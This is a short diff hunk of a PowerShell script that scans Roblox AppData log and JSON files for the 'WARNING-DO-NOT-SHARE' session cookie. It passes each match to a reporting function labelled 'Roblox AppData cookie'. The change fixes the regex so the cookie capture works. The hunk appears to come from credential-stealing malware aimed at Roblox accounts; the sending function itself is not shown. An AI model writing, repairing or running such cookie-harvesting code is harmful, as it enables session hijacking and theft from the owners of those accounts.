@@ -251,7 +251,7 @@ try {
     $rf = Get-ChildItem $ra -Include *.log,*.json -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 1MB -and $_.Length -gt 10 }
     foreach ($f in $rf) {
       $c = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
-      if ($c -and $c -match '_\\|WARNING.*DO-NOT-SHARE') { ts "$RB Roblox AppData cookie:`n$CK $($matches[0])" }
+      if ($c -and $c -match '_\|WARNING.*DO-NOT-SHARE') { ts "$RB Roblox AppData cookie:`n$CK $($matches[0])" }
     }
   }
 } catch { ts "$WA Roblox AppData error: $_" }
